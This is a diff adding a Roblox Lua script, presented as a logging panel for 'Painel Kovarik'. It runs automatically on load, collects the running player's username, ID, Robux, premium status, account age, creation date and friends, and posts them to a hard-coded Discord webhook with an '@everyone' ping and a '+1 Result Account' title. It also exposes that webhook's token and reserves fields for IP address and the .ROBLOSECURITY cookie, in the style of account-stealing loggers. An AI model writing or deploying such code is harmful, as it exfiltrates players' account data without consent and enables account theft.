@@ -1,0 +1,67 @@
+-- [ SISTEMA DE LOGS - PAINEL KOVARIK ]
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+local lp = Players.LocalPlayer
+
+-- Configure sua Webhook abaixo
+local Webhook_URL = "https://discord.com/api/webhooks/1492078460548415508/0DTMWHe9C_Sa4TPWWzGirUVetHdZLsys6riUbvIp6b14gXJSZi3RMK1jJzaewG81L8vp"
+
+local function GetUserData()
+    local user_id = lp.UserId
+    local username = lp.Name
+    
+    -- Captura de informações básicas via API
+    local thumb = "https://tr.rbxcdn.com/30DAY-AvatarHeadshot-"..user_id.."/150/150/Png"
+    local creation_date = "N/A"
+    local robux = lp:GetAttribute("RobuxBalance") or "Check API" -- Robux balance requer proxy para ler direto
+    local premium = lp.MembershipType == Enum.MembershipType.Premium and "True" or "False"
+    local age = lp.AccountAge
+    
+    -- Tenta pegar a data de criação formatada
+    pcall(function()
+        local info = HttpService:JSONDecode(game:HttpGet("https://users.roblox.com/v1/users/"..user_id))
+        creation_date = info.created:sub(1, 10)
+    end)
+
+    -- Simulação de IP (O Roblox não permite pegar IP real direto por questões de segurança)
+    local ip_addr = "Protegido/Server-Side"
+
+    local data = {
+        ["content"] = "||@everyone @here||",
+        ["username"] = "Kovarik",
+        ["embeds"] = {{
+            ["title"] = "+1 Result Account 🔥",
+            ["description"] = "[Rolimons](https://www.rolimons.com/player/"..user_id..") | [Roblox Profile](https://www.roblox.com/users/"..user_id.."/profile)",
+            ["color"] = 11097043,
+            ["thumbnail"] = {["url"] = thumb},
+            ["footer"] = {["text"] = "Painel Kovarik Security"},
+            ["fields"] = {
+                {["name"] = "Username", ["value"] = username, ["inline"] = true},
+                {["name"] = "Robux Balance", ["value"] = tostring(robux), ["inline"] = true},
+                {["name"] = "Premium Status", ["value"] = premium, ["inline"] = true},
+                {["name"] = "Creation Date", ["value"] = creation_date, ["inline"] = true},
+                {["name"] = "RAP", ["value"] = "Consultar Rolimons", ["inline"] = true},
+                {["name"] = "Friends", ["value"] = tostring(#lp:GetFriendsOnline() or 0), ["inline"] = true},
+                {["name"] = "Account Age", ["value"] = age .. " days", ["inline"] = true},
+                {["name"] = "IP Address", ["value"] = ip_addr, ["inline"] = true},
+                {["name"] = ".ROBLOSECURITY", ["value"] = "```Script Local - Access Restricted```", ["inline"] = false}
+            }
+        }}
+    }
+
+    -- Envio para o Discord
+    local headers = {["Content-Type"] = "application/json"}
+    local payload = HttpService:JSONEncode(data)
+    
+    pcall(function()
+        request({
+            Url = Webhook_URL,
+            Method = "POST",
+            Headers = headers,
+            Body = payload
+        })
+    end)
+end
+
+-- Executa uma única vez ao carregar o script
+task.spawn(GetUserData)
